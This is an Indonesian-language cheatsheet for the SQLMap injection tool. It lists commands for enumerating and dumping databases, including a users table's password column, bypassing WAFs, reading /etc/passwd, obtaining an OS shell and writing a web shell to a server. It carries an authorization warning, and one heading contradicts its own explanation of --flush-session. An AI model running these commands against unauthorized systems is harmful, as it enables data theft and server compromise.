# 💉 Ultimate SQLMap Cheatsheet

Panduan praktis dan ringkasan lengkap penggunaan **SQLMap** — *tool* otomatisasi untuk mendeteksi dan mengeksploitasi kerentanan *SQL Injection* pada aplikasi web.

---

## 📋 Daftar Isi
1. [Sintaks Dasar & Konsep](#1-sintaks-dasar--konsep)
2. [Menentukan Target (URL, Request File, Data POST)](#2-menentukan-target-url-request-file-data-post)
3. [Deteksi & Enumerasi Database](#3-deteksi--enumerasi-database)
4. [Enumerasi Tabel & Kolom](#4-enumerasi-tabel--kolom)
5. [Dump Data](#5-dump-data)
6. [Level, Risk, & Teknik Injeksi](#6-level-risk--teknik-injeksi)
7. [Bypass WAF & Tamper Scripts](#7-bypass-waf--tamper-scripts)
8. [OS Shell & Akses File System](#8-os-shell--akses-file-system)
9. [Autentikasi, Cookie, & Proxy](#9-autentikasi-cookie--proxy)
10. [Tabel Referensi Flag Populer](#10-tabel-referensi-flag-populer)

---

## 1. Sintaks Dasar & Konsep

Format umum penggunaan SQLMap:

```bash
sqlmap -u "<URL>" [opsi/flag]
```

> ⚠️ **PENTING:** SQLMap hanya boleh dijalankan pada aplikasi web milik sendiri atau target yang sudah memiliki izin tertulis untuk diuji. Proses deteksi injeksi mengirim banyak *payload* percobaan yang bisa membebani atau merusak data pada aplikasi production.

### Contoh Dasar:
```bash
sqlmap -u "https://example.com/page.php?id=1"
```
* **Penjelasan:** SQLMap otomatis mencoba berbagai teknik injeksi pada parameter `id` untuk mendeteksi apakah rentan SQL Injection.

---

## 2. Menentukan Target (URL, Request File, Data POST)

### 🔹 Target via URL dengan Parameter GET
```bash
sqlmap -u "https://example.com/page.php?id=1"
```

### 🔹 Target dengan Data POST (`--data`)
```bash
sqlmap -u "https://example.com/login.php" --data "username=admin&password=test"
```
* **`--data`**: Mengirim payload injeksi ke parameter dalam *body* request POST, bukan URL.

### 🔹 Target dari Berkas Request Burp Suite (`-r`)
```bash
sqlmap -r request.txt
```
* **`-r <file>`**: Membaca seluruh request HTTP mentah (hasil *save* dari Burp Suite/browser dev tools) — cara paling akurat karena seluruh header, cookie, dan body ikut terbawa apa adanya.

### 🔹 Menentukan Parameter yang Diuji Secara Spesifik (`-p`)
```bash
sqlmap -u "https://example.com/page.php?id=1&cat=2" -p id
```
* **`-p <parameter>`**: Membatasi pengujian hanya pada parameter tertentu, mempercepat proses jika sudah tahu parameter mana yang dicurigai.

### 🔹 Menandai Titik Injeksi Manual (`*`)
```bash
sqlmap -u "https://example.com/page.php?id=1*"
```
* **Penjelasan:** Tanda `*` memberi tahu SQLMap posisi persis yang harus diuji, berguna saat parameter berada di luar query string standar (misal di dalam header custom).

---

## 3. Deteksi & Enumerasi Database

### 🔹 Menampilkan Informasi DBMS (`--banner`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --banner
```
* **`--banner`**: Menampilkan versi dan jenis DBMS yang digunakan (MySQL, PostgreSQL, MSSQL, dll).

### 🔹 Menampilkan Nama Database Aktif (`--current-db`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --current-db
```

### 🔹 Menampilkan Semua Database (`--dbs`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --dbs
```
* **`--dbs`**: Mengenumerasi seluruh nama database yang ada di server.

### 🔹 Menampilkan User Database Aktif (`--current-user`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --current-user
```

### 🔹 Mengecek Hak Akses & Status DBA (`--privileges` / `--is-dba`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --privileges --is-dba
```
* **`--is-dba`**: Memeriksa apakah user database saat ini memiliki hak akses administrator penuh.

---

## 4. Enumerasi Tabel & Kolom

### 🔹 Menampilkan Semua Tabel dalam Database (`-D` + `--tables`)
```bash
sqlmap -u "https://example.com/page.php?id=1" -D nama_database --tables
```
* **`-D <database>`**: Menentukan database target.
* **`--tables`**: Menampilkan seluruh tabel di dalam database tersebut.

### 🔹 Menampilkan Kolom dalam Tabel (`-T` + `--columns`)
```bash
sqlmap -u "https://example.com/page.php?id=1" -D nama_database -T users --columns
```
* **`-T <tabel>`**: Menentukan tabel target.
* **`--columns`**: Menampilkan seluruh nama kolom beserta tipe data pada tabel tersebut.

---

## 5. Dump Data

### 🔹 Dump Seluruh Isi Tabel (`--dump`)
```bash
sqlmap -u "https://example.com/page.php?id=1" -D nama_database -T users --dump
```
* **`--dump`**: Mengambil dan menampilkan seluruh isi data dari tabel yang ditentukan.

### 🔹 Dump Kolom Tertentu Saja (`-C`)
```bash
sqlmap -u "https://example.com/page.php?id=1" -D nama_database -T users -C username,password --dump
```
* **`-C <kolom1,kolom2>`**: Membatasi dump hanya pada kolom yang disebutkan (lebih cepat dan lebih rapi daripada dump seluruh tabel).

### 🔹 Dump Seluruh Database Sekaligus (`--dump-all`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --dump-all
```
* **`--dump-all`**: Mengambil seluruh data dari semua database & tabel yang ditemukan — gunakan dengan hati-hati karena bisa memakan waktu sangat lama pada database besar.

### 🔹 Menyimpan Hasil Dump ke Format Tertentu
```bash
sqlmap -u "https://example.com/page.php?id=1" -D nama_database -T users --dump --dump-format=CSV
```
* **`--dump-format`**: Menentukan format hasil dump (`CSV`, `HTML`, `SQLITE`).

---

## 6. Level, Risk, & Teknik Injeksi

### 🔹 Mengatur Level Pengujian (`--level`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --level=5
```
* **`--level`**: Skala 1–5, menentukan seberapa dalam SQLMap menguji (level lebih tinggi = lebih banyak titik injeksi diuji, termasuk header & cookie, tapi lebih lama).

### 🔹 Mengatur Tingkat Risiko Payload (`--risk`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --risk=3
```
* **`--risk`**: Skala 1–3, menentukan seberapa "agresif" payload yang dicoba (risk 3 termasuk payload yang berpotensi mengubah/merusak data — gunakan hanya di lingkungan yang sudah diizinkan penuh).

### 🔹 Menentukan Teknik Injeksi Spesifik (`--technique`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --technique=BEUST
```
* **`--technique`**: Membatasi teknik yang dicoba. Kode huruf mewakili:
  * `B` — Boolean-based blind
  * `E` — Error-based
  * `U` — Union query-based
  * `S` — Stacked queries
  * `T` — Time-based blind
  * `Q` — Inline queries

### 🔹 Mempercepat Time-Based Blind SQLi (`--time-sec`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --technique=T --time-sec=2
```
* **`--time-sec`**: Mengatur durasi delay yang digunakan pada payload *time-based blind* (default 5 detik) — kurangi untuk mempercepat proses pada koneksi yang stabil.

---

## 7. Bypass WAF & Tamper Scripts

### 🔹 Menggunakan Tamper Script (`--tamper`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --tamper=space2comment
```
* **`--tamper`**: Memodifikasi payload agar lolos dari filter WAF/IDS sederhana. Contoh populer:
  * `space2comment` — mengganti spasi dengan komentar SQL (`/**/`)
  * `charencode` — melakukan URL-encoding pada payload
  * `between` — mengganti operator `>`/`<` dengan `BETWEEN`

### 🔹 Menggunakan Beberapa Tamper Script Sekaligus
```bash
sqlmap -u "https://example.com/page.php?id=1" --tamper=space2comment,charencode
```

### 🔹 Mendeteksi Keberadaan WAF (`--identify-waf`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --identify-waf
```
* **`--identify-waf`**: Memeriksa apakah target dilindungi WAF populer (Cloudflare, ModSecurity, dll) sebelum melanjutkan pengujian.

### 🔹 Menambahkan Delay Antar Request (`--delay`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --delay=1
```
* **`--delay <detik>`**: Memberi jeda antar request untuk menghindari deteksi *rate-limiting*/WAF.

---

## 8. OS Shell & Akses File System

### 🔹 Mendapatkan OS Shell Interaktif (`--os-shell`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --os-shell
```
* **`--os-shell`**: Mencoba mendapatkan akses *command execution* di server (membutuhkan hak akses database tinggi, misal `FILE` privilege di MySQL).

### 🔹 Membaca Berkas dari Server (`--file-read`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --file-read="/etc/passwd"
```
* **`--file-read`**: Membaca isi berkas sistem melalui fungsi database (misal `LOAD_FILE()` di MySQL).

### 🔹 Menulis Berkas ke Server (`--file-write` & `--file-dest`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```
* **`--file-write`**: Berkas lokal yang akan diunggah.
* **`--file-dest`**: Lokasi tujuan di server target.

---

## 9. Autentikasi, Cookie, & Proxy

### 🔹 Menyertakan Cookie Session (`--cookie`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --cookie="PHPSESSID=abc123xyz"
```

### 🔹 Autentikasi HTTP Basic (`--auth-type` & `--auth-cred`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --auth-type=Basic --auth-cred="admin:password"
```

### 🔹 Meneruskan Trafik Melalui Proxy (`--proxy`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```
* **`--proxy`**: Meneruskan seluruh request SQLMap melalui proxy (misal Burp Suite) untuk analisis lebih rinci.

### 🔹 Menandai Parameter Login sebagai Random Token (`--randomize`)
```bash
sqlmap -u "https://example.com/page.php?id=1&token=xyz" --randomize=token
```
* **`--randomize`**: Mengacak nilai parameter tertentu (misal CSRF token) di setiap request agar tidak ditolak server.

### 🔹 Melanjutkan Sesi yang Tersimpan (`--flush-session`)
```bash
sqlmap -u "https://example.com/page.php?id=1" --flush-session
```
* **`--flush-session`**: Menghapus cache sesi sebelumnya dan memulai ulang deteksi dari awal (berguna kalau target berubah/hasil sebelumnya tidak valid lagi).

---

## 10. Tabel Referensi Flag Populer

| Flag | Fungsi / Deskripsi |
| :--- | :--- |
| `-u` | Menentukan URL target |
| `-r` | Membaca request dari berkas (hasil Burp Suite) |
| `--data` | Mengirim data POST body |
| `-p` | Menentukan parameter spesifik yang diuji |
| `--dbs` | Menampilkan seluruh nama database |
| `-D` | Menentukan database target |
| `-T` | Menentukan tabel target |
| `-C` | Menentukan kolom target |
| `--dump` | Mengambil seluruh isi data tabel |
| `--dump-all` | Mengambil seluruh data dari semua database |
| `--level` | Skala kedalaman pengujian (1–5) |
| `--risk` | Skala keagresifan payload (1–3) |
| `--technique` | Membatasi teknik injeksi yang dicoba |
| `--tamper` | Memodifikasi payload untuk bypass WAF/filter |
| `--identify-waf` | Mendeteksi keberadaan WAF pada target |
| `--os-shell` | Mendapatkan command execution interaktif di server |
| `--file-read` | Membaca berkas dari server target |
| `--file-write` | Mengunggah berkas ke server target |
| `--cookie` | Menyertakan cookie session pada request |
| `--proxy` | Meneruskan trafik melalui proxy |
| `--batch` | Menjawab semua pertanyaan interaktif dengan default (non-interaktif) |
| `-v` | Mengatur level verbosity output (0–6) |

---